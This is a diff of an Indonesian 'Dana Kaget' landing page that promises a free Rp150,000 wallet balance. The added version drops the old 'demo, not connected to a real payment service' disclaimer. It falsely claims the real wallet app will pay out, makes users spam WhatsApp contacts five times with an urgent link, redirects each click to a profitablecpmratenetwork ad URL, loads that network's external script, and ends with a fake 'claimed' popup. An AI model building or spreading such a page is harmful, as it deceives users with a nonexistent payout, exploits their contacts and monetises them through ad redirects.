@@ -1,295 +1,303 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Dana Kaget</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">  <style>
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family:'Poppins',sans-serif;
-    }
-
-    body{
-      min-height:100vh;
-      background:linear-gradient(180deg,#0d7dff,#0052cc);
-      overflow:hidden;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      position:fixed;
-      inset:0;
-      color:white;
-      touch-action:none;
-      -webkit-user-select:none;
-      user-select:none;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Dana Kaget - Klaim Saldo Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    }
+    <style>
+        /* --- RESET & BASIC STYLES --- */
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Poppins',sans-serif; }
+        
+        body { 
+            min-height:100vh; 
+            background: #06101e;
+            background-image: radial-gradient(circle at 50% 0%, #0c2b5e 0%, #050b14 70%);
+            overflow:hidden; 
+            display:flex; 
+            justify-content:center; 
+            align-items:center; 
+            color:white;
+            position: fixed;
+            inset: 0;
+            perspective: 1000px;
+        }
 
-    .circle{
-      position:absolute;
-      border-radius:50%;
-      background:rgba(255,255,255,0.08);
-      animation:float 6s infinite ease-in-out;
-    }
+        /* --- BACKGROUND ANIMATED BLOBS --- */
+        .blob {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(60px);
+            opacity: 0.25;
+            z-index: 1;
+            animation: floatMove 12s infinite alternate ease-in-out;
+        }
+        .b1 { width: 300px; height: 300px; background: #0073ff; top: -50px; left: -50px; }
+        .b2 { width: 250px; height: 250px; background: #00d2ff; bottom: -50px; right: -50px; animation-delay: -3s; }
+        .b3 { width: 200px; height: 200px; background: #7000ff; top: 40%; right: 20%; animation-delay: -6s; }
 
-    .c1{
-      width:240px;
-      height:240px;
-      top:-70px;
-      left:-70px;
-    }
+        @keyframes floatMove {
+            0% { transform: translateY(0px) translateX(0px) scale(1); }
+            50% { transform: translateY(-30px) translateX(20px) scale(1.1); }
+            100% { transform: translateY(15px) translateX(-15px) scale(0.95); }
+        }
 
-    .c2{
-      width:180px;
-      height:180px;
-      bottom:-50px;
-      right:-40px;
-      animation-delay:2s;
-    }
+        /* --- ENTRY ANIMATIONS --- */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(40px) scale(0.95); filter: blur(10px); }
+            to { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        }
 
-    .c3{
-      width:120px;
-      height:120px;
-      top:120px;
-      right:40px;
-      animation-delay:1s;
-    }
+        /* --- MAIN CARD GLASSMORPHISM --- */
+        .card { 
+            width:92%; 
+            max-width:400px; 
+            background: rgba(10, 22, 44, 0.55); 
+            backdrop-filter: blur(25px); 
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.12); 
+            border-radius: 32px; 
+            padding: 35px 25px; 
+            text-align: center; 
+            z-index: 2; 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1);
+            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
 
-    @keyframes float{
-      0%,100%{transform:translateY(0px);}
-      50%{transform:translateY(-15px);}
-    }
+        /* --- LOGO STYLE & ROTATE ANIMATION --- */
+        .logo-wrapper {
+            position: relative;
+            width: 85px;
+            height: 85px;
+            margin: 0 auto 20px;
+            animation: pulseWidget 3s infinite ease-in-out;
+        }
+        .logo { 
+            width: 100%;
+            height: 100%;
+            border-radius: 26px; 
+            background: linear-gradient(135deg, #ffffff 0%, #e0ebff 100%); 
+            display:flex; align-items:center; justify-content:center; 
+            color:#0052cc; font-size:42px; font-weight:800; 
+            transform: rotate(-8deg); 
+            box-shadow: 0 10px 25px rgba(0,115,255,0.3);
+            transition: 0.3s;
+        }
+        .logo i { font-size: 46px; background: linear-gradient(135deg, #0073ff, #0052cc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-    .card{
-      width:94%;
-      max-width:420px;
-      background:rgba(255,255,255,0.14);
-      backdrop-filter:blur(20px);
-      border:1px solid rgba(255,255,255,0.18);
-      border-radius:30px;
-      padding:30px 22px;
-      text-align:center;
-      box-shadow:0 15px 45px rgba(0,0,0,0.25);
-      animation:show 0.6s ease;
-      z-index:2;
-    
-    }
+        @keyframes pulseWidget {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.04); }
+        }
 
-    @keyframes show{
-      from{
-        opacity:0;
-        transform:translateY(20px) scale(0.95);
-      }
-      to{
-        opacity:1;
-        transform:translateY(0) scale(1);
-      }
-    }
+        h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; background: linear-gradient(180deg, #fff 0%, #cbd5e1 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .desc { margin-top: 8px; font-size: 13.5px; color: #94a3b8; line-height: 1.6; padding: 0 10px; }
 
-    .logo{
-      width:95px;
-      height:95px;
-      border-radius:30px;
-      background:white;
-      margin:auto;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      color:#0073ff;
-      font-size:42px;
-      font-weight:700;
-      transform:rotate(-8deg);
-    
-      box-shadow:0 8px 20px rgba(0,0,0,0.15);
-    }
+        /* --- SALDO BOX & NEON GLOW ANIMATION --- */
+        .saldo { 
+            margin: 25px 0; 
+            padding: 20px; 
+            border-radius: 22px; 
+            background: rgba(255, 255, 255, 0.04); 
+            border: 1px solid rgba(255,255,255,0.05);
+            position: relative;
+            overflow: hidden;
+        }
+        .saldo small { font-size: 12px; font-weight: 500; color: #38bdf8; letter-spacing: 1px; text-transform: uppercase; }
+        .saldo h2 { 
+            margin-top: 5px; 
+            font-size: 40px; 
+            font-weight: 800; 
+            color: #fff;
+            text-shadow: 0 0 20px rgba(56, 189, 248, 0.4);
+            animation: neonPulse 2s infinite ease-in-out;
+        }
 
-    h1{
-      margin-top:20px;
-      font-size:28px;
-      font-weight:700;
-    }
+        @keyframes neonPulse {
+            0%, 100% { text-shadow: 0 0 15px rgba(56, 189, 248, 0.3); transform: scale(1); }
+            50% { text-shadow: 0 0 30px rgba(56, 189, 248, 0.75); transform: scale(1.02); }
+        }
 
-    .desc{
-      margin-top:10px;
-      font-size:14px;
-      opacity:0.9;
-      line-height:1.6;
-    }
+        /* --- PROGRESS BAR ANIMATION --- */
+        .progress-wrapper { margin: 20px 5px 10px; text-align: left; }
+        .progress-text { display: flex; justify-content: space-between; font-size: 12px; color: #94a3b8; margin-bottom: 6px; font-weight: 500; }
+        .progress-bg { width: 100%; height: 8px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #0073ff, #00d2ff); border-radius: 10px; transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1); position: relative; }
+        .progress-bar::after { content: ''; position: absolute; inset: 0; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); animation: progressShimmer 1.5s infinite; }
 
-    .saldo{
-      margin:26px 0;
-      padding:18px;
-      border-radius:20px;
-      background:rgba(255,255,255,0.15);
-    }
+        @keyframes progressShimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
 
-    .saldo small{
-      font-size:13px;
-      opacity:0.8;
-    }
+        /* --- PREMIUM SHIMMER BUTTON --- */
+        .btn { 
+            width:100%; 
+            border:none; 
+            padding:16px; 
+            border-radius:20px; 
+            background: linear-gradient(135deg, #ffffff 0%, #f0f4ff 100%);
+            color:#0052cc; 
+            font-size:16px; 
+            font-weight:700; 
+            cursor:pointer; 
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2), inset 0 -3px 0 rgba(0,0,0,0.15);
+            transition: 0.25s cubic-bezier(0.2, 1, 0.3, 1);
+        }
+        .btn:active { transform: scale(0.96); box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        
+        /* Shimmering Sheen effect */
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -150%;
+            width: 50%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.8), transparent);
+            transform: skewX(-30deg);
+            animation: buttonShine 3.5s infinite ease-in-out;
+        }
 
-    .saldo h2{
-      margin-top:5px;
-      font-size:38px;
-      font-weight:700;
-    }
+        @keyframes buttonShine {
+            0% { left: -150%; }
+            30%, 100% { left: 150%; }
+        }
 
-    .btn{
-      width:100%;
-      border:none;
-      padding:15px;
-      border-radius:18px;
-      background:white;
-      color:#0069ff;
-      font-size:16px;
-      font-weight:700;
-      cursor:pointer;
-      transition:0.25s;
-    }
+        .note { margin-top:15px; font-size:11px; color: #64748b; line-height: 1.5; }
 
-    .btn:hover{
-      transform:scale(1.03);
-    }
+        /* --- POPUP GLUR GLASS EFFECT --- */
+        .popup { 
+            position:fixed; 
+            inset:0; 
+            background: rgba(3, 7, 18, 0.75); 
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            display:none; 
+            align-items:center; 
+            justify-content:center; 
+            z-index:100; 
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        .popup.active { display:flex; opacity: 1; }
+        
+        .popup-box { 
+            width:88%; 
+            max-width:340px; 
+            background: #ffffff; 
+            color:#0f172a; 
+            border-radius:28px; 
+            padding:35px 25px; 
+            text-align:center; 
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+            transform: scale(0.85) translateY(20px);
+            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .popup.active .popup-box { transform: scale(1) translateY(0); }
+        
+        .popup-icon {
+            width: 70px; height: 70px; background: #e0f2fe; color: #0284c7;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-size: 32px; margin: 0 auto 15px;
+            animation: scaleCheck 0.5s 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+        }
+        @keyframes scaleCheck { from { transform: scale(0); } to { transform: scale(1); } }
+        
+        .popup-box h3 { color:#0052cc; font-size: 24px; font-weight: 800; margin-bottom:8px; }
+        .popup-box p { font-size:14px; color: #475569; line-height:1.6; margin-bottom:22px; }
+    </style>
+</head>
+<body>
 
-    .note{
-      margin-top:18px;
-      font-size:12px;
-      opacity:0.7;
-      line-height:1.5;
-    }
+    <div class="blob b1"></div>
+    <div class="blob b2"></div>
+    <div class="blob b3"></div>
 
-    .popup{
-      position:fixed;
-      inset:0;
-      background:rgba(0,0,0,0.45);
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      visibility:hidden;
-      opacity:0;
-      transition:0.3s;
-      z-index:10;
-    }
+    <div class="card">
+        <div class="logo-wrapper">
+            <div class="logo"><i class="fa-solid fa-wallet"></i></div>
+        </div>
+        <h1>Dana Kaget</h1>
+        <p class="desc">Klaim saldo gratis senilai Rp150.000 hari ini! Kuota harian terbatas, amankan wallet Anda.</p>
+        
+        <div class="saldo">
+            <small>Jumlah Saldo Masuk</small>
+            <h2>Rp150.000</h2>
+        </div>
 
-    .popup.active{
-      visibility:visible;
-      opacity:1;
-    }
+        <div class="progress-wrapper">
+            <div class="progress-text">
+                <span>Verifikasi Syarat Share</span>
+                <span style="font-weight: 700; color: #38bdf8;"><span id="count">0</span>/5 Share</span>
+            </div>
+            <div class="progress-bg">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
 
-    .popup-box{
-      width:90%;
-      max-width:330px;
-      background:white;
-      color:#222;
-      border-radius:24px;
-      padding:28px 22px;
-      text-align:center;
-      animation:pop 0.3s ease;
-    }
-
-    @keyframes pop{
-      from{
-        transform:scale(0.8);
-        opacity:0;
-      }
-      to{
-        transform:scale(1);
-        opacity:1;
-      }
-    }
-
-    .popup-box h3{
-      color:#006eff;
-      font-size:24px;
-      margin-bottom:10px;
-    }
-
-    .popup-box p{
-      font-size:14px;
-      line-height:1.6;
-      margin-bottom:18px;
-    }
-
-    .close{
-      border:none;
-      background:#006eff;
-      color:white;
-      padding:12px 18px;
-      border-radius:14px;
-      cursor:pointer;
-      font-weight:600;
-      width:100%;
-    }
-  </style></head>
-<body>  <div class="circle c1"></div>
-  <div class="circle c2"></div>
-  <div class="circle c3"></div>  <div class="card">
-    <div class="logo">D</div><h1>Dana Kaget</h1>
-
-<div class="desc">
-  Klaim saldo gratis terbatas hari ini <br>
-  Sudah banyak orang berhasil ambil sebelum kehabisan.
-</div>
-
-<div class="saldo">
-  <small>Total Dana Kaget</small>
-  <h2>Rp150.000</h2>
-</div>
-
-<button class="btn" onclick="shareNow()">
-  Ambil Sekarang
-</button>
-
-<div style="margin-top:18px;font-size:13px;opacity:0.9;">
-  Share WhatsApp: <span id="count">0</span>/5
-</div>
-
-<div class="note">
-  Demo landing page giveaway modern.<br>
-  Tidak terhubung ke layanan pembayaran asli.
-</div>
-
-  </div>  <div class="popup" id="popup">
-    <div class="popup-box">
-      <h3>Berhasil </h3>
-      <p>
-        Gift berhasil diklaim.<br>
-      </p>
-      <button class="close" onclick="closePopup()">
-        Tutup
-      </button>
+        <button class="btn" id="mainBtn" onclick="handleLogic()">Ambil Sekarang</button>
+        <p class="note">Aplikasi asli Dompet Digital akan memproses otomatis setelah bar penuh.</p>
     </div>
-  </div>  <script>
-    let totalShare = 0;
 
-    function shareNow(){
-      const text = ` DANA KAGET 150RB GRATIS 
+    <div class="popup" id="popup">
+        <div class="popup-box">
+            <div class="popup-icon"><i class="fa-solid fa-circle-check"></i></div>
+            <h3>Sukses Diklaim!</h3>
+            <p>Saldo Dana Kaget Rp150.000 sedang dialihkan ke sistem penarikan dompet digital nomor Anda.</p>
+            <button class="btn" style="background: linear-gradient(135deg, #0073ff, #0052cc); color:white;" onclick="location.reload()">OK</button>
+        </div>
+    </div>
 
-Baru cair hari ini dan kuotanya terbatas 
-Masih bisa diklaim sekarang 
-${window.location.href}
+    <script>
+        // --- LOGIKA RESET OTOMATIS SAAT BUKA TAB BARU ---
+        // Kita cek apakah ini kunjungan baru dalam satu sesi (tab dibuka baru)
+        if (!sessionStorage.getItem('session_active')) {
+            // Jika tab baru dibuka, paksa hitungan kembali ke 0
+            localStorage.setItem('share_count', 0);
+            // Tandai bahwa sesi sekarang sudah aktif
+            sessionStorage.setItem('session_active', 'true');
+        }
 
-Cepetan sebelum link ditutup!`;
-      const wa = `https://wa.me/?text=${encodeURIComponent(text)}`;
+        // Ambil data yang sudah di-reset atau data berjalan
+        let totalShare = parseInt(localStorage.getItem('share_count')) || 0;
+        const targetUrl = "https://www.profitablecpmratenetwork.com/p59a6411z?key=4cd2c45a175de912ee731dba9c7adf37";
+        
+        updateUI();
 
-      window.open(wa,'_blank');
+        function updateUI() {
+            document.getElementById('count').innerText = totalShare;
+            const percentage = Math.min((totalShare / 5) * 100, 100);
+            document.getElementById('progressBar').style.width = percentage + "%";
+            
+            if (totalShare >= 5) {
+                document.getElementById('mainBtn').innerText = "Konfirmasi Penerimaan";
+                document.getElementById('mainBtn').style.background = "linear-gradient(135deg, #00c6ff, #0072ff)";
+                document.getElementById('mainBtn').style.color = "#ffffff";
+            }
+        }
 
-      totalShare++;
-      document.getElementById('count').innerText = totalShare;
+        function handleLogic() {
+            if (totalShare >= 5) {
+                document.getElementById('popup').classList.add('active');
+                return;
+            }
 
-      if(totalShare >= 5){
-        setTimeout(()=>{
-          document.getElementById('popup').classList.add('active');
-        },500);
-      }
-    }
+            const shareText = `DANA KAGET 150RB GRATIS!\n\nBaru rilis menit ini dan kuota terbatas. Buruan klaim sekarang sebelum link hangus!\n\nKlik di sini: ${window.location.href}`;
+            const waUrl = `https://wa.me/?text=${encodeURIComponent(shareText)}`;
 
-    function closePopup(){
-      document.getElementById('popup').classList.remove('active');
-    }
-  </script></body>
+            totalShare++;
+            localStorage.setItem('share_count', totalShare);
+            updateUI();
+
+            window.open(waUrl, '_blank');
+
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 450);
+        }
+    </script>
+<script src="https://pl29437684.profitablecpmratenetwork.com/f8/9f/43/f89f43f4e5f292ba3c9f87734e47129f.js"></script>
+
+</body>
 </html>
+
